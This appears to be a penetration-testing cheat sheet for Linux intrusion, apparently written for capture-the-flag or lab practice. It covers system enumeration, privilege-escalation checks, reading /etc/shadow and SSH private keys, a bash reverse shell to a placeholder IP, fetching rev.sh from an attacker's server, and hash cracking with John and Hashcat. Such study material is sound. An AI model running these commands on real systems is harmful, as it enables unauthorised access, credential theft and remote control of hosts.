# Intrusion phase (Linux)

## Enumeration

common listing

```sh
id
whoami
pwd
ls -la
ls -l /home
```

quick distribution enum

```sh
hostname
hostname -A
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

```sh
cat /proc/version
cat /etc/issue
cat /etc/os-release
```

hardware

```sh
lscpu #cpu
lspci #pci
free #ram
```

ctl commands

```sh
systemctl #introspect and control the state of the systemd system and service manager
hostnamectl #query and change the system hostname and related settings
networkctl #introspect and configure the state of the network link
journalctl #query the contents of the systemd journal
timedatectl #query and change the system clock and its settings
loginctl #introspect and control the state of the systemd Login Manager
busctl # introspect and monitor the D-Bus bus
networkctl # Query the status of network links
localectl #query and change the system locale and keyboard layout settings
```

process and services

```sh
ps -A # View all running processes
ps axjf # View process tree
ps aux # Show processes for all users
ps -ef # Show processes in standard format
ps aux | grep root
ps -ef | grep root
top # realtime process
kill <pid> # stop process
kill -9 <pid> # force kill process
cat /etc/services

```

system variables

```sh
env
set
echo $PATH
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```

security listing

```sh
sudo -l -l # list sudoer commands
cat /etc/passwd
cat /etc/group
cat /etc/shadow
```

```sh
id
who
last
cat /etc/sudoers
cat /etc/passwd
```

```sh
# view password hash
sudo cat /etc/shadow
locate shadow | grep bak
find / -type f -name *.bak 2>/dev/null
```

network config

```sh
ifconfig # network interfaces
ip route # network routes
route # route table
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
dnsdomainname
```

network ports

```sh
netstat -at # list open TCP ports
netstat -au # list open UDP ports
netstat -l # list listening ports
netstat -s # list network usage statistics by protocol
netstat -i # show interface statistics
```

find commands

```sh
# find "flag" in the current directory
find . -name *flag*.txt -type f 2>/dev/null
# find "flag" in the home directory
find /home -name *flag*.txt -type f 2>/dev/null
# find the directory named "config"
find / -type d -name config -type f 2>/dev/null
# find files with the 777 permissions
find / -type f -perm 0777 -type f 2>/dev/null
# find executable files
find / -perm a=x -type f 2>/dev/null
# find files of user "frank" under home
find /home -user frank -type f 2>/dev/null
# find files last modified in 10 days
find / -mtime 10 -type f 2>/dev/null
# find files last accessed in 10 days
find / -atime 10 -type f 2>/dev/null
# find files last changed  in 10 days
find / -ctime 10 -type f 2>/dev/null
```

printer

```sh
lpstat -a
```

password fingerprinting

```sh
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

```sh
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

installed and running app

```sh
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

services settings misconfigured

```sh
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

## Privilege Escalation

```sh
# find world-writeable folders
find / -perm -o w -type d 2>/dev/null
# find world-executable folders
find / -perm -o x -type d 2>/dev/null
# find development tools and supported languages:
find / -name perl* 2>/dev/null
find / -name python* 2>/dev/null
find / -name gcc* 2>/dev/null
```

```sh
# find files with the SUID bit
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm /4000 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

```sh
# list enabled capabilities
getcap -r / 2>/dev/null
```

ssh key enum

```sh
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

## Enumeration Tools

+ https://github.com/carlospolop/PEASS-ng
+ https://github.com/rebootuser/LinEnum
+ https://github.com/mzet-/linux-exploit-suggester
+ https://github.com/linted/linuxprivchecker
+ https://github.com/diego-treitos/linux-smart-enumeration

## Can't create or write file ?

find writeable folder

```sh
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

HTTP Server

```sh
python3 -m http.server
wget <my_ip>:8000/rev.sh
```

## Upgrade pseudo terminal

with normal reverse shell, we don't have many luxuries such as "tab-completion" and "re-selecting" the last command executed (using the up-arrow), but importantly, we can't use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command su

we can spawn another shell and begin to make it interactive:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## SUID

+ https://gtfobins.github.io/#+suid
+ https://gtfobins.github.io/#+sudo

![image](https://user-images.githubusercontent.com/90561566/197326889-ffb67cf2-0c0c-4c80-b425-03fff624acdf.png)

## Cron job

expect for a scheduled task that runs with root privileges
 
```sh
crontab -l
cat /etc/crontab
```

## Reverse shell

```sh
/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

![image](https://user-images.githubusercontent.com/90561566/197326870-96166c91-1afc-4172-bcc5-8ce135278adb.png)

## Chmod UID

```sh
# SetUID bit enforces user ownership on an executable file	
chmod u+s
# SetGID bit enforces group ownership on files and directories
chmod g+s
```

![image](https://user-images.githubusercontent.com/90561566/197327058-b574eddb-3946-4778-bd47-81b190745c95.png)

## Capatilities

```sh
getcap -r / 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/197326980-b0ec6b42-f263-4947-8e64-0a559fd18247.png)

## PATH

```sh
# add /tmp to PATH
export PATH=/tmp:$PATH
```

![image](https://user-images.githubusercontent.com/90561566/197327088-6be5f5bc-dc32-4655-be19-f96cda114e9a.png)

## NFS

```sh
cat /etc/exports
```

![image](https://user-images.githubusercontent.com/90561566/197327366-6cdda36d-0ba8-454f-899f-cb46e3e23f19.png)

enumerating mountable shares

```sh
showmount -e <ip>
```

## Cracking

### Hash identify

```sh
hash-identifier
# or haiti-hash
gem install haiti-hash
# or name-that-hash
pip3 install name-that-hash
```

### John the ripper

+ `--wordlist`: wordlists
+ `--list=formats`: choose hash type
+ `--show`: show password cracked

```sh
base64 /etc/passwd | base64 --decode | tail -n4
base64 /etc/shadow | base64 --decode | tail -n4
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
john --show passwords.txt
```

### Hashcat

![image](https://user-images.githubusercontent.com/90561566/197317015-c0da7766-cd5e-4423-abfd-962ba23860b1.png)

+ `--username`: enable ignoring of usernames in hashfile
+ `--show`: show password cracked
+ `-a`: attack mode
+ `-m`: hashtype (`hashcat -h | grep <type>`)

```
# crack windows hash (NTLM)
hashcat -a 0 -m 1000 pass.txt /usr/share/wordlists/rockyou.txt
# crack linux hash (sha512crypt)
hashcat -a 0 -m 1800 pass.txt /usr/share/wordlists/rockyou.txt
```



